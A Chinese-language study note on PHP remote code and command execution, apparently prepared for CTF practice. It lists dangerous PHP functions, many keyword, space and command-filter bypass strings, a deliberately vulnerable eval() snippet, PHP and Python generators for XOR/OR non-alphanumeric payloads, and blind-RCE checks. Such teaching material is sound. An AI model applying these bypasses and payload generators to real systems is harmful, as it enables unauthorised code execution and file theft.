---
{"dg-publish":true,"dg-path":"xiaodi/WEB攻防_RCE.md","permalink":"/xiaodi/WEB攻防_RCE/","title":"WEB攻防_RCE"}
---

# 简单概述

- RCE代码执行：引用脚本代码解析执行
- RCE命令执行：脚本调用操作系统命令

也就是代码执行执行的是函数代码
而命令执行是执行的是系统的命令
但是两者也可以相互转化


## PHP代码执行函数
eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等


## PHP命令执行函数
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等



# RCE利用&绕过
## 关键字过滤

例如过滤`flag`关键字，可以利用：

+ 通配符
`cat f*`
`cat ?l*`

+ 转义符号
`ca\t fl\ag`
`cat fl''ag`

+ 使用空变量`$*`和`$@`，`$x`,`${x}`绕过
`ca$*t fl$*ag`
`ca$@t fl$@ag`
`ca$5t f$5lag`
`ca${2}t f${2}lag`


+ 拼接法
`a=fl;b=ag;cat $a$b`
![Pasted image 20240910210328.png](/img/user/picture/Pasted%20image%2020240910210328.png)


+ 反引号绕过
这里因为命令ls的输出是flag，所以也就是将ls的输出作为了cat命令的输入
![Pasted image 20240910210519.png](/img/user/picture/Pasted%20image%2020240910210519.png)

+ 编码绕过

```
echo 'flag' | base64
cat `echo ZmxhZwo= | base64 -d`
```
![Pasted image 20240910210821.png](/img/user/picture/Pasted%20image%2020240910210821.png)
也就是`echo ZmxhZwo= | base64 -d`这个命令的输出是flag


+ 组合绝活
```
touch "ag"
touch "fl\\"
touch "t \\"
touch "ca\\"
ls -t >shell
sh shell
```
![Pasted image 20240910211546.png](/img/user/picture/Pasted%20image%2020240910211546.png)

其中`\`指的是换行
ls -t是将文本按时间输出，其中最新创建的在前面


+ 异或无符号
这种用于绕过过滤字符的情形
```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$code = $_GET['code'];  
if(preg_match('/[a-z0-9]/i',$code)){  
    die('hacker');  
}  
eval($code);
```

![Pasted image 20240910215757.png](/img/user/picture/Pasted%20image%2020240910215757.png)
![Pasted image 20240910215809.png](/img/user/picture/Pasted%20image%2020240910215809.png)


这个脚本是通过php来生成一个txt文件，py脚本通过生成的txt文件来生成出最终的payload

其中每个脚本代码如下：

**rce-xor-or.php：**
```php
<?php
$myfile = fopen("res_xor.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) {
    for ($j=0; $j <256 ; $j++) {

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
            echo "";
        }

        else{
            $a='%'.$hex_i;
            $b='%'.$hex_j;
            $c=(urldecode($a)|urldecode($b));
            if (ord($c)>=32&ord($c)<=126) {
                $contents=$contents.$c." ".$a." ".$b."\n";
            }
        }

    }
}
fwrite($myfile,$contents);
fclose($myfile);
```


**rce-xor-or.py:**
```python
import requests
import urllib
from sys import *
import os


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("res_xor.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)


while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
    print(param)
```


 **rce-xor.php**
```php
<?php
$myfile = fopen("res.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) {
    for ($j=0; $j <256 ; $j++) {

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
            echo "";
        }

        else{
            $a='%'.$hex_i;
            $b='%'.$hex_j;
            $c=(urldecode($a)^urldecode($b));
            if (ord($c)>=32&ord($c)<=126) {
                $contents=$contents.$c." ".$a." ".$b."\n";
            }
        }

    }
}
fwrite($myfile,$contents);
fclose($myfile);
```

**rce-xor.py**

```python
import requests
import urllib
from sys import *
import os


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("res.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
    print(param)

```



+ 过滤命令执行(如cat tac)
more:一页一页的显示档案内容

less:与 more 类似

head:查看头几行

tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示

tail:查看尾几行

nl：显示的时候，顺便输出行号

od:以二进制的方式读取档案内容

vi:一种编辑器，这个也可以查看

vim:一种编辑器，这个也可以查看

sort:可以查看

uniq:可以查看

file -f:报错出具体内容

sh /flag 2>%261 //报错出文件内容

curl file:///root/f/flag

strings flag

uniq -c flag

bash -v flag

rev flag



+ 过滤空格
%09（url传递）(cat%09flag.php)

`cat${IFS}flag`

`a=fl;b=ag;cat$IFS$a$b`

{cat,flag}


# 无回显情况处理


## 检测是否有RCE漏洞

可以尝试创建一个文件来查看是否有RCE漏洞
![Pasted image 20240911192259.png](/img/user/picture/Pasted%20image%2020240911192259.png)

![Pasted image 20240911192417.png](/img/user/picture/Pasted%20image%2020240911192417.png)
![Pasted image 20240911192438.png](/img/user/picture/Pasted%20image%2020240911192438.png)


现在访问就不会提示404，说明存在RCE漏洞


还可以尝试向自己发送流量或者数据，比如ping自己，如果能收到流量，则说明存在RCE




# 练习

[[blog/安全/靶场/CTFshow_命令执行\|CTFshow_命令执行]]